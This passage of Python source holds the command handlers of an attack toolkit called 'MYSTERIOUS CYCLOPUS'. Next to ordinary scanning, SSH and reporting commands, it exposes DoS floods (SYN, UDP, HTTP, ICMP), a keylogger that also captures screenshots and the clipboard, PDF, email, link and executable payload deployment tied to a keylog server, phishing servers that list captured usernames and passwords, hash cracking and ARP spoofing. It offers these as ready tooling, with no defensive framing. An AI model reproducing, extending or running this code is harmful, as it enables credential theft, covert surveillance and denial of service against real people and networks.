        return {'success': True, 'output': f"SSH connection added: {conn.name} (ID: {conn.id})"}
    
    def _ssh_list(self, args: List[str]) -> Dict:
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        connections = self.ssh.get_connections()
        if not connections:
            return {'success': True, 'output': 'No SSH connections configured'}
        output = "SSH Connections:\n"
        for conn in connections:
            status = "✅" if conn['connected'] else "❌"
            output += f"  {status} {conn['name']} - {conn['host']}:{conn['port']} ({conn['username']})\n"
        return {'success': True, 'output': output}
    
    def _ssh_connect(self, args: List[str]) -> Dict:
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: ssh_connect <conn_id>'}
        conn_id = args[0]
        if self.ssh.connect(conn_id):
            return {'success': True, 'output': f"Connected to {conn_id}"}
        return {'success': False, 'output': f"Failed to connect to {conn_id}"}
    
    def _ssh_exec(self, args: List[str]) -> Dict:
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ssh_exec <conn_id> <command>'}
        conn_id = args[0]
        command = ' '.join(args[1:])
        result = self.ssh.execute_command(conn_id, command)
        return {'success': result.success, 'output': result.output}
    
    def _ssh_disconnect(self, args: List[str]) -> Dict:
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        conn_id = args[0] if args else None
        if conn_id:
            self.ssh.disconnect(conn_id)
            return {'success': True, 'output': f"Disconnected from {conn_id}"}
        else:
            return {'success': False, 'output': 'Usage: ssh_disconnect <conn_id>'}
    
    # ==================== Traffic Generation ====================
    def _traffic(self, args: List[str]) -> Dict:
        if not self.traffic:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: traffic <type> <ip> <duration> [port] [rate]'}
        traffic_type = args[0].lower()
        target_ip = args[1]
        try:
            duration = int(args[2])
        except:
            return {'success': False, 'output': f'Invalid duration: {args[2]}'}
        port = int(args[3]) if len(args) > 3 and args[3].isdigit() else None
        rate = int(args[4]) if len(args) > 4 and args[4].isdigit() else 100
        
        try:
            generator = self.traffic.generate(traffic_type, target_ip, duration, port, rate)
            return {'success': True, 'output': f"🚀 Generating {traffic_type} traffic to {target_ip} for {duration}s"}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    def _traffic_types(self, args: List[str]) -> Dict:
        if not self.traffic:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        types = self.traffic.get_available_types()
        output = "Available traffic types:\n" + "\n".join([f"  • {t}" for t in types])
        return {'success': True, 'output': output}
    
    def _traffic_stop(self, args: List[str]) -> Dict:
        if not self.traffic:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        generator_id = args[0] if args else None
        if self.traffic.stop(generator_id):
            return {'success': True, 'output': 'Traffic stopped'}
        return {'success': False, 'output': 'Failed to stop traffic'}
    
    def _traffic_status(self, args: List[str]) -> Dict:
        if not self.traffic:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        active = self.traffic.get_active()
        if not active:
            return {'success': True, 'output': 'No active traffic generators'}
        output = "Active Traffic Generators:\n"
        for g in active:
            output += f"  • {g['target_ip']} - {g['traffic_type']} ({g['packets_sent']} packets)\n"
        return {'success': True, 'output': output}
    
    # ==================== DOS Attacks ====================
    def _dos_syn(self, args: List[str]) -> Dict:
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: dos_syn <ip> <port> <duration> [threads]'}
        target_ip = args[0]
        port = int(args[1])
        duration = int(args[2])
        threads = int(args[3]) if len(args) > 3 else 50
        return self.dos.syn_flood(target_ip, port, duration, threads)
    
    def _dos_udp(self, args: List[str]) -> Dict:
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: dos_udp <ip> <port> <duration> [threads]'}
        target_ip = args[0]
        port = int(args[1])
        duration = int(args[2])
        threads = int(args[3]) if len(args) > 3 else 50
        return self.dos.udp_flood(target_ip, port, duration, threads)
    
    def _dos_http(self, args: List[str]) -> Dict:
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: dos_http <ip> <port> <duration> [threads]'}
        target_ip = args[0]
        port = int(args[1])
        duration = int(args[2])
        threads = int(args[3]) if len(args) > 3 else 50
        return self.dos.http_flood(target_ip, port, duration, threads)
    
    def _dos_icmp(self, args: List[str]) -> Dict:
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: dos_icmp <ip> <duration> [threads]'}
        target_ip = args[0]
        duration = int(args[1])
        threads = int(args[2]) if len(args) > 2 else 50
        return self.dos.icmp_flood(target_ip, duration, threads)
    
    def _dos_stop(self, args: List[str]) -> Dict:
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        attack_id = args[0] if args else None
        if self.dos.stop(attack_id):
            return {'success': True, 'output': 'DOS attack stopped'}
        return {'success': False, 'output': 'Failed to stop DOS attack'}
    
    def _dos_status(self, args: List[str]) -> Dict:
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        active = self.dos.get_active()
        if not active:
            return {'success': True, 'output': 'No active DOS attacks'}
        output = "Active DOS Attacks:\n"
        for a in active:
            output += f"  • {a['type']} attack on {a['target']}\n"
        return {'success': True, 'output': output}
    
    # ==================== Keylogger ====================
    def _keylogger_start(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        if self.keylogger.start():
            return {'success': True, 'output': 'Keylogger started (Press F10 to stop)'}
        return {'success': False, 'output': 'Failed to start keylogger'}
    
    def _keylogger_stop(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        self.keylogger.stop()
        return {'success': True, 'output': 'Keylogger stopped'}
    
    def _keylogger_status(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        status = "🟢 Running" if self.keylogger.running else "🔴 Stopped"
        return {'success': True, 'output': f"Keylogger Status: {status}"}
    
    def _keylogger_logs(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        limit = int(args[0]) if args else 20
        logs = self.keylogger.get_keylogs(limit)
        if not logs:
            return {'success': True, 'output': 'No keylogs found'}
        output = f"Keylogger Logs ({len(logs)}):\n"
        for log in logs:
            output += f"\n[{log.get('timestamp', '')[:19]}]\n{log.get('text', '')[:200]}\n"
        return {'success': True, 'output': output}
    
    def _keylogger_screenshots(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        screenshots = self.keylogger.get_screenshots()
        if not screenshots:
            return {'success': True, 'output': 'No screenshots captured'}
        output = "Screenshots:\n"
        for s in screenshots:
            output += f"  • {s}\n"
        return {'success': True, 'output': output}
    
    def _keylogger_clipboard(self, args: List[str]) -> Dict:
        limit = int(args[0]) if args else 20
        clipboard = self.db.get_clipboard_history(limit)
        if not clipboard:
            return {'success': True, 'output': 'No clipboard history'}
        output = "Clipboard History:\n"
        for c in clipboard:
            output += f"  [{c['timestamp'][:19]}] {c['content'][:100]}\n"
        return {'success': True, 'output': output}
    
    # ==================== Deployment Commands ====================
    def _deploy_pdf(self, args: List[str]) -> Dict:
        if not self.deployment:
            return {'success': False, 'output': 'Deployment engine not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: deploy_pdf <name> <target> <keylog_url>'}
        name = args[0]
        target = args[1]
        keylog_url = args[2]
        deployment = self.deployment.create_pdf_payload(name, target, keylog_url)
        return {
            'success': True,
            'output': f"PDF deployment created: {deployment.id}\nFile: {deployment.payload}",
            'data': {'id': deployment.id, 'path': deployment.payload}
        }
    
    def _deploy_email(self, args: List[str]) -> Dict:
        if not self.deployment:
            return {'success': False, 'output': 'Deployment engine not initialized'}
        if len(args) < 5:
            return {'success': False, 'output': 'Usage: deploy_email <name> <target> <subject> <body> <keylog_url>'}
        name = args[0]
        target = args[1]
        subject = args[2]
        body = args[3]
        keylog_url = args[4]
        deployment = self.deployment.create_email_payload(name, target, subject, body, keylog_url)
        return {
            'success': True,
            'output': f"Email deployment created: {deployment.id}\nFile: {deployment.payload}",
            'data': {'id': deployment.id, 'path': deployment.payload}
        }
    
    def _deploy_link(self, args: List[str]) -> Dict:
        if not self.deployment:
            return {'success': False, 'output': 'Deployment engine not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: deploy_link <name> <target> <keylog_url>'}
        name = args[0]
        target = args[1]
        keylog_url = args[2]
        deployment = self.deployment.create_link_payload(name, target, keylog_url)
        return {
            'success': True,
            'output': f"Link deployment created: {deployment.id}\nURL: {deployment.payload}",
            'data': {'id': deployment.id, 'url': deployment.payload}
        }
    
    def _deploy_executable(self, args: List[str]) -> Dict:
        if not self.deployment:
            return {'success': False, 'output': 'Deployment engine not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: deploy_executable <name> <target> <keylog_server>'}
        name = args[0]
        target = args[1]
        keylog_server = args[2]
        deployment = self.deployment.create_executable_payload(name, target, keylog_server)
        return {
            'success': True,
            'output': f"Executable deployment created: {deployment.id}\nFile: {deployment.payload}",
            'data': {'id': deployment.id, 'path': deployment.payload}
        }
    
    def _deploy_list(self, args: List[str]) -> Dict:
        if not self.deployment:
            return {'success': False, 'output': 'Deployment engine not initialized'}
        deployments = self.deployment.get_deployments()
        if not deployments:
            return {'success': True, 'output': 'No deployments found'}
        output = "Deployments:\n"
        for d in deployments:
            status = "📄" if d['delivered'] else "⏳"
            output += f"  {status} {d['id']} - {d['name']} ({d['type']})\n"
            output += f"     Target: {d['target']}\n"
        return {'success': True, 'output': output}
    
    # ==================== Social Engineering ====================
    def _phish(self, platform: str) -> Dict:
        result = self.social.generate_phishing_link(platform)
        if result['success']:
            output = f"🎣 Phishing link generated for {platform}\n"
            output += f"Link ID: {result['link_id']}\n"
            output += f"\nTo start server: phish_start {result['link_id']}"
            return {'success': True, 'output': output}
        return {'success': False, 'output': 'Failed to generate phishing link'}
    
    def _phish_start(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: phish_start <link_id> [port]'}
        link_id = args[0]
        port = int(args[1]) if len(args) > 1 else 8080
        if self.social.start_server(link_id, port):
            return {'success': True, 'output': f"🎣 Phishing server started on port {port}"}
        return {'success': False, 'output': f"Failed to start server for link {link_id}"}
    
    def _phish_stop(self, args: List[str]) -> Dict:
        self.social.stop_server()
        return {'success': True, 'output': 'Phishing server stopped'}
    
    def _phish_creds(self, args: List[str]) -> Dict:
        link_id = args[0] if args else None
        creds = self.social.get_captured_credentials(link_id)
        if not creds:
            return {'success': True, 'output': 'No captured credentials'}
        output = f"📧 Captured Credentials ({len(creds)}):\n"
        for c in creds[:10]:
            output += f"  • {c['timestamp'][:19]} - {c['username']}:{c['password']} from {c['ip_address']}\n"
        return {'success': True, 'output': output}
    
    # ==================== Cracking Commands ====================
    def _crack(self, args: List[str]) -> Dict:
        if not self.cracking:
            return {'success': False, 'output': 'Cracking engine not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: crack <hash_type> <hash_value> [wordlist]'}
        hash_type = args[0]
        hash_value = args[1]
        wordlist = args[2] if len(args) > 2 else None
        
        job_id = self.cracking.crack_hash(hash_type, hash_value, wordlist)
        return {
            'success': True,
            'output': f"🔓 Cracking job started: {job_id}\nHash type: {hash_type}\nHash: {hash_value[:20]}...\nUse 'crack_status {job_id}' to check progress"
        }
    
    def _crack_status(self, args: List[str]) -> Dict:
        if not self.cracking:
            return {'success': False, 'output': 'Cracking engine not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: crack_status <job_id>'}
        job_id = args[0]
        job = self.cracking.get_job_status(job_id)
        if not job:
            return {'success': False, 'output': f'Job {job_id} not found'}
        
        output = f"🔓 Cracking Job Status: {job_id}\n"
        output += f"  Type: {job.get('hash_type')}\n"
        output += f"  Status: {job.get('status')}\n"
        if job.get('result'):
            output += f"  Result: {job.get('result')}\n"
        if job.get('cracked'):
            output += "  ✅ Cracked!\n"
        return {'success': True, 'output': output}
    
    def _crack_list(self, args: List[str]) -> Dict:
        if not self.cracking:
            return {'success': False, 'output': 'Cracking engine not initialized'}
        jobs = self.cracking.get_all_jobs()
        if not jobs:
            return {'success': True, 'output': 'No cracking jobs found'}
        output = "🔓 Cracking Jobs:\n"
        for job in jobs:
            status = "✅" if job.get('cracked') else "🔄" if job.get('status') == 'running' else "⏳"
            output += f"  {status} {job.get('job_id')} - {job.get('hash_type')} ({job.get('status')})\n"
        return {'success': True, 'output': output}
    
    # ==================== ARP Spoofing Commands ====================
    def _arp_spoof(self, args: List[str]) -> Dict:
        if not self.arp_spoofing:
            return {'success': False, 'output': 'ARP spoofing engine not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: arp_spoof <target_ip> <gateway_ip> [interface]'}
        target_ip = args[0]
        gateway_ip = args[1]
        interface = args[2] if len(args) > 2 else None
        
        result = self.arp_spoofing.start_spoof(target_ip, gateway_ip, interface)
        if result.status == "running":
            return {'success': True, 'output': f"🕸️ ARP spoofing started\nTarget: {target_ip}\nGateway: {gateway_ip}\nInterface: {result.interface}"}
        return {'success': False, 'output': f"Failed to start ARP spoofing"}
    
    def _arp_stop(self, args: List[str]) -> Dict:
        if not self.arp_spoofing:
            return {'success': False, 'output': 'ARP spoofing engine not initialized'}
        spoof_id = args[0] if args else None
        if self.arp_spoofing.stop_spoof(spoof_id):
            return {'success': True, 'output': 'ARP spoofing stopped'}
        return {'success': False, 'output': 'Failed to stop ARP spoofing'}
    
    def _arp_status(self, args: List[str]) -> Dict:
        if not self.arp_spoofing:
            return {'success': False, 'output': 'ARP spoofing engine not initialized'}
        active = self.arp_spoofing.get_active_spoofs()
        if not active:
            return {'success': True, 'output': 'No active ARP spoofing'}
        output = "🕸️ Active ARP Spoofs:\n"
        for s in active:
            output += f"  • {s['target_ip']} -> {s['gateway_ip']} ({s['interface']}) - {s['status']}\n"
        return {'success': True, 'output': output}
    
    def _arp_history(self, args: List[str]) -> Dict:
        if not self.arp_spoofing:
            return {'success': False, 'output': 'ARP spoofing engine not initialized'}
        limit = int(args[0]) if args else 20
        history = self.arp_spoofing.get_spoof_history(limit)
        if not history:
            return {'success': True, 'output': 'No ARP spoofing history'}
        output = "📋 ARP Spoofing History:\n"
        for h in history:
            output += f"  • {h['target_ip']} -> {h['gateway_ip']} - {h['status']} ({h['packets_sent']} packets)\n"
        return {'success': True, 'output': output}
    
    # ==================== MAC Commands ====================
    def _mac_info(self, args: List[str]) -> Dict:
        if not self.mac_manager:
            return {'success': False, 'output': 'MAC manager not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: mac_info <mac_address>'}
        mac = args[0]
        info = self.mac_manager.get_mac_info(mac)
        output = f"📡 MAC Information:\n"
        output += f"  MAC Address: {info.get('mac_address', 'Unknown')}\n"
        output += f"  Vendor: {info.get('vendor', 'Unknown')}\n"
        output += f"  IP Address: {info.get('ip_address', 'Unknown')}\n"
        output += f"  Hostname: {info.get('hostname', 'Unknown')}\n"
        return {'success': True, 'output': output}
    
    def _mac_scan(self, args: List[str]) -> Dict:
        if not self.mac_manager:
            return {'success': False, 'output': 'MAC manager not initialized'}
        network = args[0] if args else None
        results = self.mac_manager.scan_network(network)
        if not results:
            return {'success': True, 'output': 'No devices found'}
        output = "📡 Network MAC Scan Results:\n"
        for r in results:
            output += f"  • {r['ip_address']} - {r['mac_address']} ({r['vendor']})\n"
        return {'success': True, 'output': output}
    
    def _mac_vendor(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: mac_vendor <mac_address>'}
        mac = args[0]
        vendor = self.tools.get_mac_vendor(mac)
        if vendor:
            return {'success': True, 'output': f"Vendor for {mac}: {vendor}"}
        return {'success': False, 'output': f"Could not determine vendor for {mac}"}
    
    # ==================== NAT Commands ====================
    def _nat_info(self, args: List[str]) -> Dict:
        if not self.nat_info:
            return {'success': False, 'output': 'NAT info engine not initialized'}
        info = self.nat_info.get_nat_info()
        output = f"🌐 NAT Information:\n"
        output += f"  Public IP: {info.public_ip}\n"
        output += f"  Private IP: {info.private_ip}\n"
        output += f"  Router IP: {info.router_ip}\n"
        output += f"  Country: {info.country}\n"
        output += f"  ISP: {info.isp}\n"
        output += f"  NAT Type: {info.nat_type}"
        return {'success': True, 'output': output}
    
    def _nat_public(self, args: List[str]) -> Dict:
        if not self.nat_info:
            return {'success': False, 'output': 'NAT info engine not initialized'}
        info = self.nat_info.get_nat_info()
        return {'success': True, 'output': f"Public IP: {info.public_ip}"}
    
    def _nat_private(self, args: List[str]) -> Dict:
        if not self.nat_info:
            return {'success': False, 'output': 'NAT info engine not initialized'}
        info = self.nat_info.get_nat_info()
        return {'success': True, 'output': f"Private IP: {info.private_ip}"}
    
    # ==================== Transformer Commands ====================
    def _transform(self, args: List[str]) -> Dict:
        if not self.transformer:
            return {'success': False, 'output': 'Transformer not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: transform <input_text>'}
        text = ' '.join(args)
        result = self.transformer.process_input(text)
        output = f"🔮 Transformer Analysis:\n"
        output += f"  Intent: {result['command']}\n"
        output += f"  Confidence: {result['confidence']:.2f}\n"
        output += f"  Tokens: {result['tokens']}\n"
        output += f"  Parameters: {json.dumps(result['params'], indent=2)}"
        return {'success': True, 'output': output}
    
    # ==================== Docker Commands ====================
    def _docker_scan(self, args: List[str]) -> Dict:
        if not self.docker_scanner:
            return {'success': False, 'output': 'Docker scanner not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: docker_scan <image>'}
        image = args[0]
        result = self.docker_scanner.scan_image(image)
        if result['success']:
            output = f"🐳 Docker scan of {image} completed\n"
            output += f"  Severity: {result.get('severity', 'unknown')}\n"
            output += f"  Vulnerabilities: {len(result.get('vulnerabilities', []))}\n"
            for v in result.get('vulnerabilities', [])[:5]:
                output += f"  • {v.get('description', '')[:100]}\n"
            return {'success': True, 'output': output}
        return {'success': False, 'output': result.get('error', 'Scan failed')}
    
    def _docker_info(self, args: List[str]) -> Dict:
        if not self.docker_scanner:
            return {'success': False, 'output': 'Docker scanner not initialized'}
        result = self.docker_scanner.docker_info()
        return {'success': result['success'], 'output': result['output']}
    
    def _docker_ps(self, args: List[str]) -> Dict:
        if not self.docker_scanner:
            return {'success': False, 'output': 'Docker scanner not initialized'}
        result = self.docker_scanner.docker_ps()
        return {'success': result['success'], 'output': result['output']}
    
    def _docker_images(self, args: List[str]) -> Dict:
        if not self.docker_scanner:
            return {'success': False, 'output': 'Docker scanner not initialized'}
        result = self.docker_scanner.docker_images()
        return {'success': result['success'], 'output': result['output']}
    
    # ==================== Email Commands ====================
    def _email_compose(self, args: List[str]) -> Dict:
        if not self.email_composer:
            return {'success': False, 'output': 'Email composer not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: email_compose <to> <subject> <body> [html]'}
        to = args[0]
        subject = args[1]
        body = ' '.join(args[2:]) if len(args) > 2 else ''
        html = len(args) > 3 and args[3].lower() == 'html'
        
        email_msg = self.email_composer.compose_email(to, subject, body, html=html)
        return {
            'success': True,
            'output': f"📧 Email composed\nTo: {to}\nSubject: {subject}\nUse 'email_send <id>' to send"
        }
    
    def _email_send(self, args: List[str]) -> Dict:
        if not self.email_composer:
            return {'success': False, 'output': 'Email composer not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: email_send <email_id>'}
        email_id = int(args[0])
        result = self.email_composer.send_email(email_id)
        if result['success']:
            return {'success': True, 'output': f"📧 Email sent successfully: {result['message']}"}
        return {'success': False, 'output': f"Failed to send email: {result.get('error', 'Unknown error')}"}
    
    def _email_list(self, args: List[str]) -> Dict:
        if not self.email_composer:
            return {'success': False, 'output': 'Email composer not initialized'}
        status = args[0] if args and args[0] in ['draft', 'sent', 'failed'] else None
        emails = self.email_composer.get_emails(status, 20)
        if not emails:
            return {'success': True, 'output': 'No emails found'}
        output = "📧 Emails:\n"
        for e in emails:
            output += f"  • ID: {e['id']} - To: {e['to_address']} - Subject: {e['subject'][:30]} - Status: {e['status']}\n"
        return {'success': True, 'output': output}
    
    # ==================== PDF Report Commands ====================
    def _report_generate(self, args: List[str]) -> Dict:
        if not self.pdf_report:
            return {'success': False, 'output': 'PDF report generator not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: report_generate <title> <target>'}
        title = args[0]
        target = args[1]
        
        analysis = {
            'target': target,
            'timestamp': datetime.datetime.now().isoformat(),
            'scan_results': {},
            'recommendations': ['Review open ports', 'Check for vulnerabilities']
        }
        
        result = self.pdf_report.generate_report(title, target, analysis)
        if result['success']:
            return {'success': True, 'output': f"📊 PDF Report generated: {result['file_path']}"}
        return {'success': False, 'output': f"Failed to generate report: {result.get('error', 'Unknown error')}"}
    
    def _report_list(self, args: List[str]) -> Dict:
        if not self.pdf_report:
            return {'success': False, 'output': 'PDF report generator not initialized'}
        reports = self.pdf_report.get_reports(20)
        if not reports:
            return {'success': True, 'output': 'No reports found'}
        output = "📊 PDF Reports:\n"
        for r in reports:
            output += f"  • {r['title']} - {r['target']} - {r['created_at'][:19]}\n"
        return {'success': True, 'output': output}
    
    # ==================== Network Monitor ====================
    def _netmon_start(self, args: List[str]) -> Dict:
        if not self.network_monitor:
            return {'success': False, 'output': 'Network monitor not initialized'}
        self.network_monitor.start()
        return {'success': True, 'output': 'Network monitor started'}
    
    def _netmon_stop(self, args: List[str]) -> Dict:
        if not self.network_monitor:
            return {'success': False, 'output': 'Network monitor not initialized'}
        self.network_monitor.stop()
        return {'success': True, 'output': 'Network monitor stopped'}
    
    def _netmon_status(self, args: List[str]) -> Dict:
        if not self.network_monitor:
            return {'success': False, 'output': 'Network monitor not initialized'}
        stats = self.network_monitor.get_statistics()
        output = f"Network Monitor Status:\n"
        output += f"  Running: {self.network_monitor.running}\n"
        output += f"  Interface: {self.network_monitor.interface}\n"
        output += f"  Packets captured: {self.network_monitor.packet_count}\n"
        return {'success': True, 'output': output}
    
    def _netmon_packets(self, args: List[str]) -> Dict:
        if not self.network_monitor:
            return {'success': False, 'output': 'Network monitor not initialized'}
        limit = int(args[0]) if args else 20
        packets = self.network_monitor.get_packets(limit)
        if not packets:
            return {'success': True, 'output': 'No packets captured'}
        output = f"Recent Packets ({len(packets)}):\n"
        for p in packets:
            output += f"  {p.get('timestamp', '')[:19]} {p.get('source_ip', '')} -> {p.get('dest_ip', '')} ({p.get('protocol', 'unknown')})\n"
        return {'success': True, 'output': output}
    
    # ==================== Scan Commands ====================
    def _scan(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: scan <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'quick')
        return {'success': result.success, 'output': result.output}
    
    def _quick_scan(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: quick_scan <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'quick')
        return {'success': result.success, 'output': result.output}
    
    def _full_scan(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: full_scan <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'full')
        return {'success': result.success, 'output': result.output}
    
    # ==================== IP Management ====================
    def _add_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: add_ip <ip> [notes]'}
        ip = args[0]
        notes = ' '.join(args[1:]) if len(args) > 1 else ''
        
        try:
            ipaddress.ip_address(ip)
            if self.db.add_managed_ip(ip, None, 'cli', notes):
                return {'success': True, 'output': f'✅ IP {ip} added to monitoring'}
            return {'success': False, 'output': f'Failed to add IP {ip}'}
        except ValueError:
            return {'success': False, 'output': f'Invalid IP: {ip}'}
    
    def _remove_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: remove_ip <ip>'}
        ip = args[0]
        self.db.conn.execute("DELETE FROM managed_ips WHERE ip_address = ?", (ip,))
        self.db.conn.commit()
        return {'success': True, 'output': f'✅ IP {ip} removed'}
    
    def _block_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: block_ip <ip> [reason]'}
        ip = args[0]
        reason = ' '.join(args[1:]) if len(args) > 1 else 'Manually blocked'
        self.tools.block_ip(ip)
        return {'success': True, 'output': f'🔒 IP {ip} blocked: {reason}'}
    
    def _unblock_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: unblock_ip <ip>'}
        ip = args[0]
        self.tools.unblock_ip(ip)
        return {'success': True, 'output': f'🔓 IP {ip} unblocked'}
    
    def _list_ips(self, args: List[str]) -> Dict:
        ips = self.db.get_managed_ips(True)
        if not ips:
            return {'success': True, 'output': 'No managed IPs'}
        output = "📋 Managed IPs:\n"
        for ip in ips:
            status = "🔒" if ip['is_blocked'] else "🟢"
            output += f"  {status} {ip['ip_address']} - {ip.get('notes', '')}\n"
        return {'success': True, 'output': output}
    
    def _ip_info(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ip_info <ip>'}
        ip = args[0]
        try:
            ipaddress.ip_address(ip)
            location = self.tools.location(ip)
            
            output = f"🔍 IP Information: {ip}\n{'='*40}\n"
            if location.get('success'):
                output += f"📍 Location: {location.get('country')}, {location.get('city')}\n"
                output += f"📡 ISP: {location.get('isp')}\n"
            return {'success': True, 'output': output}
        except ValueError:
            return {'success': False, 'output': f'Invalid IP: {ip}'}
    
    def _analyze_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: analyze_ip <ip>'}
        ip = args[0]
        
        ping_result = self.tools.ping(ip, 4)
        location = self.tools.location(ip)
        
        output = f"🐙 CYCLOPUS IP Analysis Report for {ip}\n"
        output += "=" * 50 + "\n\n"
        
        output += "📡 Ping Results:\n"
        output += ping_result.output[:500] + "\n\n"
        
        if location.get('success'):
            output += "📍 Geolocation:\n"
            output += f"  Country: {location.get('country')}\n"
            output += f"  City: {location.get('city')}\n"
            output += f"  ISP: {location.get('isp')}\n"
        
        return {'success': True, 'output': output}
    
    # ==================== System Commands ====================
    def _status(self, args: List[str]) -> Dict:
        stats = self.db.get_statistics()
        output = f"""
🐙 MYSTERIOUS CYCLOPUS System Status
{'='*40}
📊 Statistics:
  Total Commands: {stats.get('total_commands', 0)}
  Total Threats: {stats.get('total_threats', 0)}
  Managed IPs: {stats.get('total_managed_ips', 0)}
  Blocked IPs: {stats.get('blocked_ips', 0)}
  SSH Connections: {stats.get('total_ssh_connections', 0)}
  Phishing Links: {stats.get('total_phishing_links', 0)}
  Captured Credentials: {stats.get('captured_credentials', 0)}
  Keylog Entries: {stats.get('total_keylogs', 0)}
  DOS Attacks: {stats.get('total_dos_attacks', 0)}
  Deployments: {stats.get('total_deployments', 0)}
  Cracking Jobs: {stats.get('total_cracking_jobs', 0)}
  ARP Spoofs: {stats.get('total_arp_spoofs', 0)}
  MAC Entries: {stats.get('total_mac_entries', 0)}
  Emails: {stats.get('total_emails', 0)}
  PDF Reports: {stats.get('total_pdf_reports', 0)}

💻 System Info:
  Platform: {platform.system()} {platform.release()}
  Hostname: {socket.gethostname()}
  Local IP: {self.tools.get_local_ip()}
  CPU: {psutil.cpu_percent()}%
  Memory: {psutil.virtual_memory().percent}%
  Disk: {psutil.disk_usage('/').percent}%
"""
        return {'success': True, 'output': output}
    
    def _history(self, args: List[str]) -> Dict:
        limit = 20
        if args and args[0].isdigit():
            limit = int(args[0])
        history = self.db.conn.execute(
            "SELECT command, source, timestamp, success FROM command_history ORDER BY timestamp DESC LIMIT ?",
            (limit,)
        ).fetchall()
        if not history:
            return {'success': True, 'output': 'No command history'}
        output = "📜 Command History:\n"
        for h in history:
            status = "✅" if h['success'] else "❌"
            output += f"  {status} {h['timestamp'][:19]} - {h['command'][:50]}\n"
        return {'success': True, 'output': output}
    
    def _system(self, args: List[str]) -> Dict:
        output = f"""
💻 System Information
{'='*40}
OS: {platform.system()} {platform.release()} {platform.version()}
Hostname: {socket.gethostname()}
Python: {sys.version}
CPU Cores: {psutil.cpu_count()}
CPU Usage: {psutil.cpu_percent()}%
Memory: {psutil.virtual_memory().total / (1024**3):.1f}GB total, {psutil.virtual_memory().percent}% used
Disk: {psutil.disk_usage('/').total / (1024**3):.1f}GB total, {psutil.disk_usage('/').percent}% used
Boot Time: {datetime.datetime.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M:%S')}
"""
        return {'success': True, 'output': output}
    
    def _report(self, args: List[str]) -> Dict:
        stats = self.db.get_statistics()
        
        report = f"""
🐙 MYSTERIOUS CYCLOPUS Security Report
{'='*50}
Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

📊 Statistics:
  Total Commands: {stats.get('total_commands', 0)}
  Total Threats: {stats.get('total_threats', 0)}
  Managed IPs: {stats.get('total_managed_ips', 0)}
  Blocked IPs: {stats.get('blocked_ips', 0)}
  SSH Connections: {stats.get('total_ssh_connections', 0)}
  Phishing Links: {stats.get('total_phishing_links', 0)}
  Captured Credentials: {stats.get('captured_credentials', 0)}
  Keylog Entries: {stats.get('total_keylogs', 0)}
  Cracking Jobs: {stats.get('total_cracking_jobs', 0)}
"""
        filename = f"report_{int(time.time())}.txt"
        filepath = os.path.join(REPORT_DIR, filename)
        with open(filepath, 'w') as f:
            f.write(report)
        
        return {'success': True, 'output': report + f"\n\n📁 Report saved: {filepath}"}
    
    def _clear(self, args: List[str]) -> Dict:
        os.system('cls' if os.name == 'nt' else 'clear')
        return {'success': True, 'output': ''}
    
